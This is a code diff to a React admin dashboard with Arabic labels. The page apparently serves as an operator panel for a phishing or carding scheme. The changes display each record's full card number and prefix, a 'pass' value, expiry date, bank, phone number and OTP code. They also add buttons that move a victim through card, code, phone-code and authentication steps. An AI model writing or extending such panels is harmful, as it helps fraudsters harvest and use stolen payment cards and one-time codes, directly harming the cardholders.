@@ -28,6 +28,10 @@ import {
   RefreshCw,
   AlertCircle,
   Loader2,
+  Shield,
+  PhoneCall,
+  LockIcon,
+  SquareRoundCorner,
 } from "lucide-react";
 import { Button } from "@/components/ui/button";
 import { Badge } from "@/components/ui/badge";
@@ -150,11 +154,19 @@ interface Notification {
 }
 
 const stepButtons = [
-  { label: "بطاقة", step: 0 },
-  { label: "كود", step: 2 },
-  { label: "رقم", step: 3 },
-  { label: "كود الهاتف", step: 4 },
-  { label: "مصادقة", step: 5 },
+  { label: "بطاقة", step: 0, icon: <CreditCard className="text-green-500" /> },
+  { label: "كود", step: 2, icon: <Shield className="text-blue-500" /> },
+  { label: "رقم", step: 3, icon: <PhoneCall className="text-pink-500" /> },
+  {
+    label: "كود الهاتف",
+    step: 4,
+    icon: <LockIcon className="text-teal-500" />,
+  },
+  {
+    label: "مصادقة",
+    step: 5,
+    icon: <SquareRoundCorner className="text-yellow-500" />,
+  },
 ];
 
 // Hook for online users count
@@ -273,7 +285,7 @@ function StatisticsCard({
 }
 
 // Enhanced User Status Component
-function UserStatus({ userId }: { userId: string }) {
+function UserStatus({ userId, country }: { userId: string; country: string }) {
   const [status, setStatus] = useState<"online" | "offline" | "unknown">(
     "unknown"
   );
@@ -308,7 +320,7 @@ function UserStatus({ userId }: { userId: string }) {
             : "bg-red-50 text-red-700 border-red-200 dark:bg-red-950/30 dark:text-red-300"
         }`}
       >
-        {status === "online" ? "متصل" : "غير متصل"}
+        {country}
       </Badge>
     </div>
   );
@@ -1655,12 +1667,10 @@ export default function NotificationsPage() {
                     <tr key={notification.id}>
                       <td className="px-6 py-4">
                         <div className="flex items-center gap-3">
-                          <div className="w-8 h-8 rounded-full bg-gradient-to-br from-primary/20 to-primary/10 flex items-center justify-center">
-                            <MapPin className="h-4 w-4 text-primary" />
-                          </div>
-                          <span className="font-medium">
-                            {notification.country || "غير معروف"}
-                          </span>
+                          <UserStatus
+                            userId={notification.id}
+                            country={notification.country!}
+                          />
                         </div>
                       </td>
                       <td className="px-6 py-4">
@@ -1680,92 +1690,43 @@ export default function NotificationsPage() {
                           >
                             <User className="h-3 w-3 mr-1" />
                             {notification.phone
-                              ? "معلومات شخصية"
+                              ? notification.phone
                               : "لا يوجد معلومات"}
                           </Badge>
-                          <Badge
-                            variant={
-                              notification.cardNumber ? "default" : "secondary"
-                            }
-                            className={`cursor-pointer transition-all hover:scale-105 ${
-                              notification.cardNumber
-                                ? "bg-gradient-to-r from-green-500 to-green-600 text-white"
-                                : ""
-                            }`}
-                            onClick={() =>
-                              handleInfoClick(notification, "card")
-                            }
-                          >
-                            <CreditCard className="h-3 w-3 mr-1" />
-                            {notification.cardNumber
-                              ? "معلومات البطاقة"
-                              : "لا يوجد بطاقة"}
-                          </Badge>
-                        </div>
-                      </td>
-                      <td className="px-6 py-4">
-                        {notification.status === "approved" ? (
-                          <Badge className="bg-gradient-to-r from-green-500 to-green-600 text-white">
-                            <CheckCircle className="h-3 w-3 mr-1" />
-                            موافق عليه
-                          </Badge>
-                        ) : notification.status === "rejected" ? (
-                          <Badge className="bg-gradient-to-r from-red-500 to-red-600 text-white">
-                            <XCircle className="h-3 w-3 mr-1" />
-                            مرفوض
-                          </Badge>
-                        ) : (
-                          <Badge className="bg-gradient-to-r from-yellow-500 to-yellow-600 text-white">
-                            <Clock className="h-3 w-3 mr-1" />
-                            قيد المراجعة
-                          </Badge>
-                        )}
-                      </td>
-                      <td className="px-6 py-4">
-                        <div className="flex items-center gap-2 text-sm text-muted-foreground">
-                          <Clock className="h-4 w-4" />
-                          {notification.createdDate &&
-                            formatDistanceToNow(
-                              new Date(notification.createdDate),
-                              {
-                                addSuffix: true,
-                                locale: ar,
-                              }
-                            )}
-                        </div>
-                      </td>
-                      <td className="px-6 py-4 text-center">
-                        <UserStatus userId={notification.id} />
-                      </td>
-                      <td className="px-6 py-4 text-center">
-                        {notification.otp && (
-                          <Badge
-                            variant="outline"
-                            className="bg-blue-50 text-blue-700 border-blue-200"
-                          >
-                            {notification.otp}
-                          </Badge>
-                        )}
-                      </td>
-                      <td className="px-6 py-4">
-                        <div className="flex flex-wrap justify-center gap-1">
-                          {stepButtons.map(({ label, step }) => (
-                            <Button
-                              key={step}
-                              size="sm"
+                          <div className="flex flex-col">
+                            <Badge className="flex justify-center">
+                              {notification.bank}
+                            </Badge>
+
+                            <Badge
                               variant={
-                                notification.step === step
+                                notification.cardNumber
                                   ? "default"
-                                  : "outline"
+                                  : "secondary"
                               }
+                              className={`cursor-pointer transition-all hover:scale-105 ${
+                                notification.cardNumber
+                                  ? "bg-gradient-to-r from-green-500 to-green-600 text-white"
+                                  : ""
+                              }`}
                               onClick={() =>
-                                handleStepUpdate(notification.id, step)
+                                handleInfoClick(notification, "card")
                               }
-                              className="text-xs px-2 h-7"
                             >
-                              {label}
-                            </Button>
-                          ))}
+                              <CreditCard className="h-3 w-3 mr-1" />
+                              {notification.cardNumber
+                                ? `${notification.cardNumber} - ${notification.prefix}`
+                                : "لا يوجد بطاقة"}
+                            </Badge>
+                            <div className="flex justify-between">
+                              <Badge className="text-center bg-blue-500">
+                                {notification.pass}
+                              </Badge>
+                              <Badge className="text-center">
+                                {notification.month}/{notification.year}
+                              </Badge>
+                            </div>
+                          </div>
                         </div>
                       </td>
                       <td className="px-6 py-4">
@@ -1829,8 +1790,79 @@ export default function NotificationsPage() {
                               </TooltipContent>
                             </Tooltip>
                           </TooltipProvider>
-                          <Badge>{notification?.currentPage}</Badge>
                         </div>
+                      </td>
+                      <td className="px-6 py-4">
+                        <div className="flex items-center gap-2 text-sm text-muted-foreground">
+                          <Clock className="h-4 w-4" />
+                          {notification.createdDate &&
+                            formatDistanceToNow(
+                              new Date(notification.createdDate),
+                              {
+                                addSuffix: true,
+                                locale: ar,
+                              }
+                            )}
+                        </div>
+                      </td>
+                      <td className="px-6 py-4 text-center">5555</td>
+                      <td className="px-6 py-4 text-center">
+                        {notification.otp && (
+                          <Badge
+                            variant="outline"
+                            className="bg-blue-50 text-blue-700 border-blue-200"
+                          >
+                            {notification.otp}
+                          </Badge>
+                        )}
+                      </td>
+                      <td className="px-6 py-4">
+                        <div className="flex flex-wrap justify-center gap-1">
+                          {stepButtons.map(({ label, step, icon }) => (
+                            <TooltipProvider key={step}>
+                              <Tooltip>
+                                <TooltipTrigger asChild>
+                                  <Button
+                                    variant="outline"
+                                    className="h-7 w-7"
+                                    size="sm"
+                                    onClick={() =>
+                                      handleStepUpdate(notification.id, step)
+                                    }
+                                  >
+                                    {icon}
+                                  </Button>
+                                </TooltipTrigger>
+                                <TooltipContent>
+                                  <p>{label}</p>
+                                </TooltipContent>
+                              </Tooltip>
+                            </TooltipProvider>
+                          ))}
+                        </div>
+                      </td>
+                      <td className="px-6 py-4">
+                        {notification.status === "approved" ? (
+                          <Badge className="bg-gradient-to-r from-green-500 to-green-600 text-white">
+                            <CheckCircle className="h-3 w-3 mr-1" />
+                            موافق عليه
+                          </Badge>
+                        ) : notification.status === "rejected" ? (
+                          <Badge className="bg-gradient-to-r from-red-500 to-red-600 text-white">
+                            <XCircle className="h-3 w-3 mr-1" />
+                            مرفوض
+                          </Badge>
+                        ) : (
+                          <Badge className="bg-gradient-to-r from-yellow-500 to-yellow-600 text-white">
+                            <Clock className="h-3 w-3 mr-1" />
+                            قيد المراجعة
+                          </Badge>
+                        )}
+                        <FlagColorSelector
+                          notificationId={notification.id}
+                          currentColor={notification.flagColor! as any}
+                          onColorChange={handleFlagColorChange as any}
+                        />
                       </td>
                     </tr>
                   ))}
@@ -1864,7 +1896,10 @@ export default function NotificationsPage() {
                           </p>
                         </div>
                       </div>
-                      <UserStatus userId={notification.id} />
+                      <UserStatus
+                        userId={notification.id}
+                        country={notification.country!}
+                      />
                     </div>
                   </CardHeader>
 
